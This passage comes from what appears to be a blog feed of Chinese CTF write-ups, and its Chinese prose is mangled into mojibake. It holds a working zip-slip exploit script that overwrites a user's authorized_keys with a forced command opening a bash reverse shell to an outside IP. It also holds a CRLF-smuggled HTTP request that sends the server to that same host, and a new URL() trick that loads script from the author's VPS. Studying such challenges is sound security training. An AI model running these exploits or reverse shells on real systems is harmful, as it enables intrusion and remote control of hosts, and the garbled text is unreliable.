class="literal">true</span>,</span><br><span class="line">ContinueOnError:        <span class="literal">false</span>,</span><br><span class="line">OverwriteExisting:      <span class="literal">true</span>,</span><br><span class="line">ImplicitTopLevelFolder: <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è§£å‹â½‚ä»¶åˆ°tmpâ½¬å½•,</span></span><br><span class="line">err = z.Unarchive(filename, <span class="string">&quot;/tmp&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åˆ é™¤å‹ç¼©åŒ…â½‚ä»¶</span></span><br><span class="line">err = os.Remove(filename)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;failed to delete file &#x27;%s&#x27;\n&quot;</span>, filename)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯¥è·¯ç”±ä¸Šä¼ æ–‡ä»¶ï¼Œï¼Œå¹¶ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸€ä¸ªè§£å‹æ“ä½œï¼Œè§£å‹åˆ°tmpä¸‹ã€‚</p><h2 id="adminè·¯ç”±"><span id="adminè·¯ç”±"> adminè·¯ç”±</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">admin</span><span class="params">(c *gin.Context)</span> &#123;</span><br><span class="line">key, err := ioutil.ReadFile(<span class="string">&quot;/home/vanzy/.ssh/id_rsa&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Create signer from private key</span></span><br><span class="line">signer, err := ssh.ParsePrivateKey(key)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// SSH server configuration</span></span><br><span class="line">config := &amp;ssh.ClientConfig&#123;</span><br><span class="line">User: <span class="string">&quot;vanzy&quot;</span>,</span><br><span class="line">Auth: []ssh.AuthMethod&#123;</span><br><span class="line">ssh.PublicKeys(signer),</span><br><span class="line">&#125;,</span><br><span class="line">HostKeyCallback: ssh.InsecureIgnoreHostKey(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Connect to SSH server</span></span><br><span class="line">conn, err := ssh.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;localhost:2221&quot;</span>, config)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line">defer conn.Close()</span><br><span class="line"><span class="comment">// Create a new SSH session</span></span><br><span class="line">session, err := conn.NewSession()</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line">defer session.Close()</span><br><span class="line"><span class="comment">// Run a command on the SSH server</span></span><br><span class="line">out, err := session.Output(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(string(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºæ˜¯æƒ³åŠæ³•æ‹¿åˆ°å¯†é’¥å¹¶è¿›è¡Œè¦†ç›–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"><span class="variable">pub</span> <span class="operator">=</span> requests.get(<span class="string">&#x27;http://localhost:8888/readfile?file=/home/vanzy/.ssh/id_rsa.pub&#x27;</span>).text</span><br><span class="line"><span class="title function_">print</span><span class="params">(pub)</span></span><br><span class="line">with <span class="title function_">open</span><span class="params">(<span class="string">&#x27;hh.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span> as f:</span><br><span class="line"> f.write(<span class="string">&#x27;command=&quot;bash -c \&#x27;bash -i &gt;&amp;/dev/tcp/43.143.192.19/1145 0&gt;&amp;1\&#x27;&quot; &#x27;</span> + pub)</span><br><span class="line"># the name of the zip file to <span class="type">generate</span></span><br><span class="line"><span class="variable">zf</span> <span class="operator">=</span> zipfile.ZipFile(<span class="string">&#x27;1.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">url = <span class="string">&quot;http://localhost:8888/file-unarchiver&quot;</span></span><br><span class="line">fname = <span class="string">&#x27;hh.txt&#x27;</span></span><br><span class="line">#destination path of the file</span><br><span class="line">zf.write(fname, <span class="string">&#x27;../home/vanzy/.ssh/authorized_keys&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/zip&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line">cookies = &#123;<span class="string">&quot;XDEBUG_SESSION&quot;</span>:<span class="string">&quot;PHPSTORM&quot;</span>&#125;</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,<span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.zip&quot;</span>,open(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>),<span class="string">&quot;application/zip&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">res2 = requests.post(url=url,data=files,headers=headers,cookies=cookies,proxies=proxies,files=files)</span><br></pre></td></tr></table></figure><p>ä¸€æ³¢æ–‡ä»¶ä¸Šä¼ ï¼Œè§£å‹åç›®å½•ç©¿è¶Šï¼Œè¦†ç›–/home/vanzy/.ssh/authorized_keys<br>æ•´ä¸ªæµç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"><span class="variable">pub</span> <span class="operator">=</span> requests.get(<span class="string">&#x27;http://159.138.131.31:8888/readfile?file=/home/vanzy/.ssh/id_rsa.pub&#x27;</span>).text</span><br><span class="line"><span class="title function_">print</span><span class="params">(pub)</span></span><br><span class="line">with <span class="title function_">open</span><span class="params">(<span class="string">&#x27;hh.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span> as f:</span><br><span class="line"> f.write(<span class="string">&#x27;command=&quot;bash -c \&#x27;bash -i &gt;&amp;/dev/tcp/43.143.192.19/1145 0&gt;&amp;1\&#x27;&quot; &#x27;</span> + pub)</span><br><span class="line"># the name of the zip file to <span class="type">generate</span></span><br><span class="line"><span class="variable">zf</span> <span class="operator">=</span> zipfile.ZipFile(<span class="string">&#x27;1.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">url = <span class="string">&quot;http://159.138.131.31:8888/file-unarchiver&quot;</span></span><br><span class="line">fname = <span class="string">&#x27;hh.txt&#x27;</span></span><br><span class="line">#destination path of the file</span><br><span class="line">zf.write(fname, <span class="string">&#x27;../home/vanzy/.ssh/authorized_keys&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/zip&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line">cookies = &#123;<span class="string">&quot;XDEBUG_SESSION&quot;</span>:<span class="string">&quot;PHPSTORM&quot;</span>&#125;</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,<span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.zip&quot;</span>,open(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>),<span class="string">&quot;application/zip&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">res2 = requests.post(url=url,data=files,headers=headers,cookies=cookies,proxies=proxies,files=files)</span><br><span class="line">requests.get(url=<span class="string">&quot;http://159.138.131.31:8888/admin&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="easychek1n"><span id="easychek1n"> easyChek1n</span></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /<span class="number">2023</span>/%20HTTP/<span class="number">1.1</span>%<span class="number">0d</span>%0aHost:%<span class="number">20127.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">0d</span>%0a%<span class="number">0d</span>%0aGET%<span class="number">20</span>/<span class="number">2022.</span>php%3furl%3d43<span class="number">.143</span><span class="number">.192</span><span class="number">.19</span>%3a1145/%3fb%<span class="number">3d</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">115.239</span><span class="number">.215</span><span class="number">.75</span>:<span class="number">8082</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">112.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,ja;q=0.8</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
    <category term="å¤ç°" scheme="https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>ACTF-å¤ç°</title>
    <link href="https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-12-02T00:12:41.000Z</published>
    <updated>2023-12-02T11:42:25.754Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">å†™åœ¨å‰é¢</a></li><li><a href="#easy-latex">easy latex</a><ul><li><a href="#new-url%E7%89%B9%E6%80%A7">new URLç‰¹æ€§ğŸ˜‚</a><ul><li><a href="#%E8%BF%90%E7%94%A8%E5%88%B0%E9%A2%98%E7%9B%AE">è¿ç”¨åˆ°é¢˜ç›®ğŸ¤ª</a></li></ul></li><li><a href="#visit%E8%A7%A6%E5%8F%91">visitè§¦å‘</a></li></ul></li><li><a href="#hooks">hooks</a><ul><li><a href="#what-is-webhook">what is webhookğŸ¤”</a></li><li><a href="#abusing-jenkins-login">Abusing Jenkins login</a></li><li><a href="#%E5%BC%80%E6%89%93">å¼€æ‰“ğŸ˜¤</a></li></ul></li><li><a href="#~ave-mujicas-masquerade~">~Ave Mujicaâ€™s Masquerade~</a><ul><li><a href="#%E6%BA%90%E7%A0%81%E5%86%B2">æºç ,å†²ğŸ˜“</a></li></ul></li><li><a href="#story">story</a><ul><li><a href="#%E6%BA%90%E7%A0%81">æºç ğŸ¤”</a></li></ul></li></ul><!-- tocstop --><h1 id="å†™åœ¨å‰é¢"><span id="å†™åœ¨å‰é¢"> å†™åœ¨å‰é¢</span></h1><p>å‘œå‘œå‘œ,shanhegiegieå¤ªçŒ›äº†,æ‰“äº†ä¸€å¤©æ‡’çŒ«,ç¬¬äºŒå¤©è¿˜è¦ä¸Šè¯¾,å‘¨å…­è¡¥è¯¾,æ˜¯è°å•Š,åŸæ¥æ˜¯ğŸ‘´å•Š,é‚£æ²¡äº‹äº†(nmsl).</p><p>å‚è€ƒ:</p><p><a href="https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c">https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c</a></p><p><a href="https://mp.weixin.qq.com/s/pzXApXq3LhZvZvc87qqMDw">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p><h1 id="easy-latex"><span id="easy-latex"> easy latex</span></h1><h2 id="new-urlç‰¹æ€§"><span id="new-urlç‰¹æ€§"> new URLç‰¹æ€§ğŸ˜‚</span></h2><p>å…ˆæ¥ä¸ªå°demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> username = <span class="string">&quot;43.143.192.19:1145&quot;</span></span><br><span class="line"><span class="keyword">const</span> vip_url = <span class="string">&quot;http://vip:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username,vip_url))</span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030151912.png" alt="å¾®ä¿¡æˆªå›¾_20231030151912"></p><p>å¦‚æ­¤,pathnameæ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå‚æ•°,hostæ˜¯æˆ‘ä»¬çš„ç¬¬äºŒä¸ªå‚æ•°.</p><p>å€˜è‹¥æˆ‘ç¬¬ä¸€ä¸ªå‚æ•°å‰é¢åŠ \\æˆ–æ˜¯//,é˜ä¸‹åˆå½“å¦‚ä½•åº”å¯¹ğŸ˜“.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> username = <span class="string">&quot;\\\\43.143.192.19:1145&quot;</span></span><br><span class="line"><span class="comment">//const username = &quot;//43.143.192.19:1145&quot;</span></span><br><span class="line"><span class="keyword">const</span> vip_url = <span class="string">&quot;http://vip:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username,vip_url))</span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030152151.png" alt="å¾®ä¿¡æˆªå›¾_20231030152151"></p><p>å–œæ¬¢æˆ‘ç»•è¿‡æ±¡æŸ“hostå—ğŸ˜›</p><h3 id="è¿ç”¨åˆ°é¢˜ç›®"><span id="è¿ç”¨åˆ°é¢˜ç›®"> è¿ç”¨åˆ°é¢˜ç›®ğŸ¤ª</span></h3><p>ä¸å¤šbb,æºç é‰´èµä¸€æ³¢</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/preview&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; tex, theme &#125; = req.<span class="property">query</span></span><br><span class="line">    <span class="keyword">if</span> (!tex) &#123;</span><br><span class="line">        tex = <span class="string">&#x27;Today is \\today.&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> nonce = <span class="title function_">getNonce</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">let</span> base = <span class="string">&#x27;https://cdn.jsdelivr.net/npm/latex.js/dist/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (theme) &#123;</span><br><span class="line">        base = <span class="keyword">new</span> <span class="title function_">URL</span>(theme, <span class="string">`http://<span class="subst">$&#123;req.headers.host&#125;</span>/theme/`</span>) + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;preview.html&#x27;</span>, &#123; tex, nonce, base &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æˆ‘ç›´æ¥themeä¸Šæ”¾å…¥æˆ‘çš„vps,è¿œç¨‹åŠ è½½å¥¥è¥¿ç»™</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preview?tex=asd&amp;theme=<span class="comment">//43.143.192.19:1145</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030173612.png" alt="å¾®ä¿¡æˆªå›¾_20231030173612"></p><p>ç»ä¸€æ ¼å¾·æ‹‰ç±³çš„æµ‹è¯•ğŸ˜¤,wcsndm,å°±ç®—å•¥è·¯å¾„éƒ½ä¸åŠ ä»–éƒ½ä¼šè®¿é—®/js/base.js,è¿™å¾ˆä¸è‡ªç”±ğŸ¤”.</p><p>æ²¡å…³ç³»,ç›´æ¥åœ¨vpsèµ·ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„emoji,ğŸ‘´çœŸæ˜¯ä¸ªå¤©æ‰.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;wcsndm&#x27;</span>);</span><br></pre></td></tr></table></figure><p>/var/www/html/base/base.jsæ”¾ä¸Šè¿™ä¸ªä»£ç ,æµ‹è¯•ä¸€æ³¢,è®©æˆ‘ç‹ ç‹ åœ°æµ‹!!!ğŸ¥µ</p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030175131.png" alt="å¾®ä¿¡æˆªå›¾_20231030175131"></p><p>æ¬§å†…çš„æ‰‹,å¥½æ±‰,å¥¥è¥¿ç»™,çˆ½çš„é›…ç—,æ¯”ğŸå‡ºæ¥è¿˜çˆ½.</p><h2 id="visitè§¦å‘"><span id="visitè§¦å‘"> visitè§¦å‘</span></h2><p>ä¸å¤šbb,ä¸Šæºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/share/:id&#x27;</span>, reportLimiter, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span></span><br><span class="line">    <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;no note id specified&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://localhost:<span class="subst">$&#123;PORT&#125;</span>/note/<span class="subst">$&#123;id&#125;</span>`</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">visit</span>(url)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;something error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">visit</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`start: <span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">headless</span>: <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">        <span class="attr">executablePath</span>: <span class="string">&#x27;/usr/bin/google-chrome-stable&#x27;</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>],</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ctx = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> ctx.<span class="title function_">newPage</span>();</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">            <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">            <span class="attr">domain</span>: <span class="string">`<span class="subst">$&#123;APP_HOST&#125;</span>:<span class="subst">$&#123;APP_PORT&#125;</span>`</span>,</span><br><span class="line">            <span class="attr">httpOnly</span>: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123;<span class="attr">timeout</span>: <span class="number">5000</span>&#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">3000</span>)</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> ctx.<span class="title function_">close</span>();</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`done: <span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä¼—æ‰€å‘¨çŸ¥,visitå°±æ˜¯èƒ½å¤Ÿè‡ªè¡Œæ‰“å¼€æµè§ˆå™¨å¹¶ä¸”è®¿é—®,ä¸çŸ¥é“çš„è¯ä¸Šç½‘æŸ¥,åˆ«é—®ğŸ‘´.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vip&#x27;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">session</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> &#123; code &#125; = req.<span class="property">body</span></span><br><span class="line">    <span class="keyword">let</span> vip_url = <span class="variable constant_">VIP_URL</span></span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username, vip_url), &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="title class_">Cookie</span>: <span class="title class_">Object</span>.<span class="title function_">entries</span>(req.<span class="property">cookies</span>).<span class="title 